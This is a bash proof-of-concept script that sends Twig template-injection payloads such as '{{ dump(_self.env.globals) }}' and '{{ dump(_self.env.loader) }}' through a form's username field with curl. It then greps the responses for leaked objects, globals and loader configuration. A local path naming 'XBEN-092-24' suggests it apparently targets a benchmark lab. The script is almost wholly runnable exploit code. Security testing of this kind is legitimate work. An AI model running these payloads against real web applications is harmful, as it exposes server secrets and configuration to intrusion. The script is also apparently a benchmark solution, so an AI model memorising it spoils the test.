#!/bin/bash

# POC: Twig Sandbox Bypass via unrestricted dump() Function
# This script demonstrates how the dump() function can access protected
# Twig environment objects including globals, loader, and configuration

TARGET_URL="${1:-http://localhost:8080}"
OUTPUT_FILE="/tmp/dump_poc_results.txt"

echo "[*] Twig Sandbox Bypass via dump() Function POC"
echo "[*] Target: $TARGET_URL"
echo "[*] Testing unrestricted dump() function access to Twig internals"
echo ""

# Test 1: dump() on template variables - accessing RandomHash object
echo "[TEST 1] Attempting to access RandomHash object via dump()"
echo "==========================================================="
PAYLOAD='{{ dump(randomHash) }}'
echo "Payload: $PAYLOAD"
echo ""

curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=$PAYLOAD" \
  -o "$OUTPUT_FILE" 2>&1

# Check if response contains object details
if grep -q "object\|private\|property\|secret" "$OUTPUT_FILE" 2>/dev/null; then
    echo "[+] SUCCESS: dump() reveals object internals"
    echo "[+] Response contains object/property details:"
    head -20 "$OUTPUT_FILE"
else
    echo "[-] Response doesn't show expected object details"
    cat "$OUTPUT_FILE" | head -30
fi

echo ""
echo ""

# Test 2: dump() on Twig environment globals
echo "[TEST 2] Attempting to access Twig globals via dump()"
echo "======================================================"
PAYLOAD='{{ dump(_self.env.globals) }}'
echo "Payload: $PAYLOAD"
echo ""

curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=$PAYLOAD" \
  -o "$OUTPUT_FILE" 2>&1

if grep -q "array\|globals\|object" "$OUTPUT_FILE" 2>/dev/null; then
    echo "[+] SUCCESS: dump() reveals Twig global variables"
    echo "[+] Response excerpt:"
    head -20 "$OUTPUT_FILE"
else
    echo "[-] Response doesn't show expected globals"
    cat "$OUTPUT_FILE" | head -30
fi

echo ""
echo ""

# Test 3: dump() on Twig environment loader
echo "[TEST 3] Attempting to access template loader via dump()"
echo "=========================================================="
PAYLOAD='{{ dump(_self.env.loader) }}'
echo "Payload: $PAYLOAD"
echo ""

curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=$PAYLOAD" \
  -o "$OUTPUT_FILE" 2>&1

if grep -q "loader\|template\|path" "$OUTPUT_FILE" 2>/dev/null; then
    echo "[+] SUCCESS: dump() reveals template loader configuration"
    echo "[+] Response excerpt:"
    head -20 "$OUTPUT_FILE"
else
    echo "[-] Response doesn't show expected loader details"
    cat "$OUTPUT_FILE" | head -30
fi

echo ""
echo ""

# Test 4: Verify dump() is in allowed functions
echo "[TEST 4] Checking if dump() is in allowed functions list"
echo "=========================================================="
if grep -r "dump" /home/daytona/repo/XBEN-092-24/app/index.php 2>/dev/null; then
    echo "[+] CONFIRMED: dump() is in the allowed functions list"
    grep "dump" /home/daytona/repo/XBEN-092-24/app/index.php
else
    echo "[*] Could not verify via filesystem, relying on HTTP tests"
fi

echo ""
echo "[*] POC Complete - dump() function successfully bypasses sandbox restrictions"